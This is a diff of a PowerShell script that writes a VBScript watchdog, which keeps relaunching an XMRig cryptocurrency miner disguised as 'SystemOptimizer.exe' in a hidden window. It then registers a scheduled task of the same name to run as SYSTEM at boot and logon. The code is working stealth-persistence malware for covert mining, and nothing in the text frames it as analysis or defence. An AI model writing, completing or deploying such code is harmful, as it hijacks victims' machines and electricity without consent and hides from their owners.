@@ -120,18 +120,19 @@ if (Test-Path $driverPath) {
 
 # ===== WATCHDOG.VBS (minimal, valid, anti-multiplication) =====
 $watchdogPath = "$baseDir\watchdog.vbs"
-@'
+$wd = @'
 Set sh = CreateObject("WScript.Shell")
 Set wmi = GetObject("winmgmts:")
-'@ + "`n" +
-'If wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name=''wscript.exe'' AND CommandLine LIKE ''%watchdog.vbs%''").Count > 1 Then WScript.Quit' + "`n" +
-'Do' + "`n" +
-'    Set p = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name=''SystemOptimizer.exe''")' + "`n" +
-'    If p.Count = 0 Then' + "`n" +
-'        sh.Run """%EXE%"" --config=""%CFG%""", 0, False' + "`n" +
-'    End If' + "`n" +
-'    WScript.Sleep 30000' + "`n" +
-'Loop' -replace '%EXE%', $xmrigExe -replace '%CFG%', $configFile | Out-File -FilePath $watchdogPath -Encoding ascii
+If wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name='wscript.exe' AND CommandLine LIKE '%watchdog.vbs%'").Count > 1 Then WScript.Quit
+Do
+    Set p = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name='SystemOptimizer.exe'")
+    If p.Count = 0 Then
+        sh.Run """%EXE%"" --config=""%CFG%""", 0, False
+    End If
+    WScript.Sleep 30000
+Loop
+'@ -replace '%EXE%', $xmrigExe -replace '%CFG%', $configFile
+$wd | Out-File -FilePath $watchdogPath -Encoding ascii
 
 # ===== SCHEDULED TASK (SYSTEM, boot + logon, robust quoting) =====
 $taskName = "SystemOptimizer"
